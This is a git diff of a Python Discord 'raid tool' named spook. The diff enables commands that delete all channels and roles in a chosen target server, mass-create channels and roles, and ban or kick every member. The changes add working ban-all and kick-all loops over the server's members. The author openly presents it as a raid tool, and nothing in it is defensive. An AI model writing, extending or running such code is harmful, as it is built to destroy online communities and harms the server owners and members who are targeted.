@@ -14,14 +14,12 @@ def banner():
 / __| '_ \ / _ \ / _ \| |/ /
 \__ \ |_) | (_) | (_) |   < 
 |___/ .__/ \___/ \___/|_|\_\
-    |_| {0}by badaboum#6183{1}
-	'''.format(Fore.CYAN, Fore.WHITE).split('\n')
+    |_| {0}{2}{3}v1.1{4}{0} by badaboum#6183{1}
+	'''.format(Fore.CYAN, Fore.WHITE, Fore.BLACK, Style.BRIGHT, Style.NORMAL).split('\n')
 
 	for line in _banner:
 		print(' ' * (round(os.get_terminal_size().columns / 2) - 14) + line)
 	
-	print('version 1.0.0')
-	print('shit discord raid tool i devlopped in a night (more will be added soon)\n')
 
 def success(message):
 	print('{0}[+]{1} {2}'.format(Fore.GREEN, Fore.WHITE, message))
@@ -44,7 +42,7 @@ client = discord.Client()
 @client.event
 async def on_ready():
 	clear()
-	success('logged in as {4}"{3}{0}{5}#{3}{1}{4}" ({3}{2}{4})\n\n'.format(client.user.name, client.user.discriminator, client.user.id, Fore.CYAN, Fore.WHITE, Fore.BLUE))
+	success('logged in as {4}"{3}{0}#{1}{4}" ({3}{2}{4})\n\n'.format(client.user.name, client.user.discriminator, client.user.id, Fore.CYAN, Fore.WHITE))
 
 	servers = {}
 	targeted = False
@@ -65,7 +63,7 @@ async def on_ready():
 			command = args[0].lower()
 
 			if command == 'help':
-				
+
 				emotes = {'..': '0', 'oo': '-', '@@': 'O', '66': '^', ' "': '~'}
 				eyes = random.choice(['..', 'oo', '@@', '66', ' "'])
 				mouth = emotes[eyes]
@@ -76,16 +74,19 @@ async def on_ready():
 
 				commands = {
 					'show servers': 'show server list',
+					#'show infos': 'show current target infos',
 					'use <server id>': 'set target server',
 					'delete-channels': 'delete all channels',
-					#'delete-roles': 'delete all roles',
+					'delete-roles': 'delete all roles',
 					#'set-role <username>#<tag> <role id>': 'set user role',
 					'create-channels "<channel name>" <number to create>': 'create channels',
-					#'ban-all': 'ban all users',
-					#'kick-all': 'kick all users',
+					'create-roles "<role name>" <number to create>': 'create roles',
+					'ban-all': 'ban all users',
+					'kick-all': 'kick all users',
 					#'server-infos': 'get server infos',
 					'clear': 'clear the terminal',
 					'credits': 'show credits',
+					'logout': 'quit spook'
 				}
 
 				for command, description in commands.items():
@@ -97,6 +98,28 @@ async def on_ready():
 					except:
 						help += ' ' * len('`"""""``    ') + ' {1}→{0} {2} {1}({3})\n'.format(Fore.WHITE, Fore.CYAN, command, description)
 				print(help)
+
+			elif command == 'ban-all':
+				if targeted == True:
+					for member in guilds.members:
+						try:
+							await member.ban()
+							success('banned one member.')
+						except:
+							fail('can\'t ban one member.')
+				else:
+					fail('please set a target first (→ \'use <server id>\')')
+
+			elif command == 'kick-all':
+				if targeted == True:
+					for member in guilds.members:
+						try:
+							await member.kick()
+							success('banned one member.')
+						except:
+							fail('can\'t ban one member.')
+				else:
+					fail('please set a target first (→ \'use <server id>\')')
 
 			elif command == 'clear':
 				clear()
@@ -113,8 +136,14 @@ async def on_ready():
 									print('{3}id: {4}{0} {3}name: {4}{1} {3}members: {4}{2}'.format(guild.id, guild.name, guild.member_count, Fore.WHITE, Fore.CYAN))
 								except:
 									pass
+					#elif show_what == 'infos':
+					#	pumpkin = '      __J"L__\n  ,-"`--...--\'"-.\n /  /\\       /\\  \\\nJ  /__\\  _  /__\\  L\n|       / \\       |\nJ    _  """  _    F\n \\   \\/\\_/\\//    /\n  "-._\\/\\_/\\/_,-"'
+
+					else:
+						raise
+						
 				except IndexError:
-					fail('you forgot one of requiered argument: show servers')
+						fail('you forgot one of requiered argument: show <servers/infos>')
 
 			elif command == 'use':
 				try:
@@ -161,12 +190,17 @@ async def on_ready():
 				else:
 					fail('please set a target first (→ \'use <server id>\')')
 
+			elif command == 'logout':
+				while 1:
+					c = input('are you want to exit (y/n): ').lower()
+					if c == 'y':
+						exit()
+					elif c == 'n':
+						break
+
 		except IndexError:
 			pass
 		except KeyboardInterrupt:
 			exit()
 
-try:
-	client.run(token)
-except KeyboardInterrupt:
-	exit()
+client.run(token)
